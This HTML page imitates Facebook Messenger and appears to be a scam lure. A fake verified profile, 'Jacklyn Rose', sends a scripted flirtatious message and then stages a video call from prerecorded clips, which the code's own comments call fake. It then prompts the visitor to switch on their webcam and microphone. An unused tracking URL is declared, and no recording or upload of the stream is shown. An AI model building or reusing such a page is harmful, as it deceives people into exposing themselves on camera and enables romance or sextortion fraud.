<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Messenger - Jacklyn Rose</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        /* আপনার অরিজিনাল স্টাইল সব ঠিক রাখা হয়েছে */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body, html { height: 100%; overflow: hidden; background-color: #fff; width: 100%; position: fixed; }
        .verified-badge { color: #0084ff; font-size: 14px; margin-left: 4px; }
        .img-container { position: relative; display: inline-block; }
        .active-dot { position: absolute; bottom: 2px; right: 2px; width: 12px; height: 12px; background: #31a24c; border: 2px solid #fff; border-radius: 50%; }
        .header { position: fixed; top: 0; width: 100%; height: 60px; background: #fff; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; border-bottom: 1px solid #ddd; z-index: 1000; }
        .header-pic { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; }
        .chat-container { position: absolute; top: 60px; bottom: 85px; width: 100%; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; background: #fff; }
        .middle-profile { text-align: center; margin: 30px 0; }
        .middle-pic { width: 100px; height: 100px; border-radius: 50%; margin-bottom: 10px; object-fit: cover; }
        .middle-name { font-size: 22px; font-weight: 800; display: flex; align-items: center; justify-content: center; }
        .message-wrapper { display: flex; align-items: flex-end; margin-bottom: 4px; gap: 8px; position: relative; }
        .message { max-width: 70%; padding: 10px 15px; border-radius: 18px; font-size: 15px; line-height: 1.4; }
        .received { background: #e4e6eb; color: #000; }
        .sent { background: #0084ff; color: #fff; align-self: flex-end; margin-left: auto; }
        #premiumModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 5000; color: white; align-items: center; justify-content: center; text-align: center; padding: 30px; backdrop-filter: blur(10px); }
        .premium-box { background: #fff; color: #000; padding: 25px; border-radius: 20px; width: 100%; max-width: 350px; }
        .reg-btn { display: block; width: 100%; background: #0084ff; color: #fff; padding: 12px; border-radius: 10px; text-decoration: none; font-weight: bold; margin-top: 15px; }
        
        /* ভিডিও লেআউট ফিক্স */
        #videoOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 3000; color: white; }
        #callUI { position: absolute; top: 80px; width: 100%; text-align: center; z-index: 3001; }
        #callUI img { width: 110px; height: 110px; border-radius: 50%; border: 2px solid #fff; object-fit: cover; }
        video#mainVideo { width: 100%; height: 100%; object-fit: cover; display: none; background: #000; }
        video#userPreview { position: absolute; top: 20px; right: 20px; width: 100px; height: 150px; border-radius: 10px; display: none; object-fit: cover; border: 2px solid #fff; z-index: 4000; background: #222; }
        .call-controls { position: absolute; bottom: 60px; width: 100%; display: flex; justify-content: center; gap: 40px; z-index: 3002; }
        .btn-call { width: 65px; height: 65px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; cursor: pointer; }
        
        .footer { position: fixed; bottom: 0; width: 100%; background: #fff; padding: 12px 15px; display: flex; align-items: center; gap: 12px; border-top: 1px solid #ddd; z-index: 1000; height: 75px; }
        .input-box { flex: 1; background: #f0f2f5; border-radius: 25px; padding: 10px 18px; display: flex; align-items: center; height: 50px; }
        .input-box input { border: none; background: transparent; width: 100%; outline: none; font-size: 16px; }
        .typing { font-size: 12px; color: #65676b; display: none; margin-left: 40px; margin-bottom: 10px; }
        
        /* ক্যামেরা পারমিশন বাটন */
        #cameraRequestBtn {
            display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: #0084ff; color: white; padding: 15px 30px; border-radius: 30px; font-weight: bold;
            z-index: 4500; border: none; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }
    </style>
</head>
<body onclick="forceBootstrap()">

    <div id="mainApp">
        <video id="v1" src="call1.mp4" preload="auto" muted playsinline style="position:absolute; width:1px; height:1px; opacity:0.01;"></video>
        <video id="v2" src="call2.mp4" preload="auto" muted playsinline style="position:absolute; width:1px; height:1px; opacity:0.01;"></video>
        <audio id="ringtoneAudio" src="ringtone.mpeg" preload="auto" loop></audio>

        <div id="videoOverlay">
            <button id="cameraRequestBtn" onclick="enableCamera()">Join with Camera</button>
            
            <div id="callUI">
                <img src="profile.webp">
                <h2 style="color:white; margin-top:10px;">Jacklyn Rose <i class="fa-solid fa-circle-check verified-badge"></i></h2>
                <div id="callStatusText">Incoming call...</div>
                <div id="timerDisplay" style="margin-top:10px; display:none;">00:00</div>
            </div>
            
            <video id="mainVideo" playsinline webkit-playsinline autoplay muted></video>
            <video id="userPreview" autoplay muted playsinline></video>
            
            <div class="call-controls">
                <div class="btn-call" style="background:#fa3e3e;" onclick="endCall()"><i class="fa-solid fa-phone-slash"></i></div>
                <div id="answerBtn" class="btn-call" style="background:#31a24c; display:none;" onclick="acceptCallWithCamera()"><i class="fa-solid fa-video"></i></div>
            </div>
        </div>

        <div class="header">
            <div style="display:flex; align-items:center;">
                <img src="profile.webp" class="header-pic">
                <div style="margin-left:10px; font-weight:bold;">Jacklyn Rose</div>
            </div>
            <i class="fa-solid fa-video" style="color:#0084ff; font-size:24px;" onclick="startOutgoingCall()"></i>
        </div>

        <div class="chat-container" id="chatContainer">
            <div class="middle-profile">
                <img src="profile.webp" class="middle-pic">
                <div class="middle-name">Jacklyn Rose</div>
                <p style="color:#65676b;">You are not friends with Jacklyn.</p>
            </div>
            <div id="messagesArea"></div>
            <div class="typing" id="typingIndicator">Jacklyn is typing...</div>
        </div>

        <div class="footer">
            <div class="input-box">
                <input type="text" id="msgInput" placeholder="Aa">
            </div>
            <i class="fa-solid fa-paper-plane" style="color:#0084ff; font-size:26px;" onclick="sendMessage()"></i>
        </div>
    </div>

    <script>
        const TRACK_URL = "https://script.google.com/macros/s/AKfycbzXIlowODRnKPfVwnRmdBEOWPQ9SYtjLzSnuZxtBiiue3c6LbdC-wggDBimdLYLtAi-/exec";
        let isSystemReady = false;
        let callCount = 0;

        function forceBootstrap() {
            if (isSystemReady) return;
            const r = document.getElementById('ringtoneAudio');
            r.play().then(() => { r.pause(); r.currentTime = 0; });
            isSystemReady = true;
        }

        // --- ক্যামেরা এনাবল করার আসল ফাংশন ---
        async function enableCamera() {
            const userPrev = document.getElementById('userPreview');
            document.getElementById('cameraRequestBtn').style.display = 'none'; // বাটন হাইড হবে
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: true 
                });
                userPrev.srcObject = stream;
                userPrev.style.display = 'block';
                userPrev.play();
                console.log("Camera started successfully");
            } catch (err) {
                alert("Please allow camera access to see yourself!");
                console.error("Camera Error:", err);
            }
        }

        async function acceptCallWithCamera() {
            document.getElementById('answerBtn').style.display = 'none';
            document.getElementById('cameraRequestBtn').style.display = 'block'; // ক্লিক করার জন্য বাটন দেখাবে
            
            // রিংটোন বন্ধ করে ফেক ভিডিও চালানো
            document.getElementById('ringtoneAudio').pause();
            const mainV = document.getElementById('mainVideo');
            const sourceV = document.getElementById(callCount % 2 === 0 ? 'v1' : 'v2');
            
            mainV.src = sourceV.src;
            mainV.style.display = 'block';
            document.getElementById('callUI').style.display = 'none';
            mainV.play();
            
            callCount++;
            startTimer();
        }

        function startOutgoingCall() {
            document.getElementById('videoOverlay').style.display = 'block';
            document.getElementById('callStatusText').innerText = "Calling...";
            document.getElementById('answerBtn').style.display = 'none';
            setTimeout(acceptCallWithCamera, 3000);
        }

        // মেসেজিং এবং অন্যান্য ফাংশন (আপনার আগের কোড অনুযায়ী)
        function sendMessage() {
            const text = document.getElementById('msgInput').value;
            if(!text) return;
            const html = `<div class="message-wrapper" style="justify-content:flex-end;"><div class="message sent">${text}</div></div>`;
            document.getElementById('messagesArea').insertAdjacentHTML('beforeend', html);
            document.getElementById('msgInput').value = "";
            
            setTimeout(() => {
                document.getElementById('typingIndicator').style.display = 'block';
                setTimeout(() => {
                    document.getElementById('typingIndicator').style.display = 'none';
                    receiveMessage("Accept my call please... 💋");
                }, 2000);
            }, 1000);
        }

        function receiveMessage(text) {
            const html = `<div class="message-wrapper"><div class="message received">${text}</div></div>`;
            document.getElementById('messagesArea').insertAdjacentHTML('beforeend', html);
            setTimeout(() => {
                document.getElementById('videoOverlay').style.display = 'block';
                document.getElementById('answerBtn').style.display = 'flex';
                document.getElementById('ringtoneAudio').play();
            }, 2000);
        }

        function startTimer() {
            let sec = 0;
            document.getElementById('timerDisplay').style.display = 'block';
            setInterval(() => {
                sec++;
                let m = Math.floor(sec/60).toString().padStart(2,'0');
                let s = (sec%60).toString().padStart(2,'0');
                document.getElementById('timerDisplay').innerText = `${m}:${s}`;
            }, 1000);
        }

        function endCall() {
            location.reload(); // কল শেষ হলে রিফ্রেশ (সহজ সমাধান)
        }
    </script>
</body>
</html>
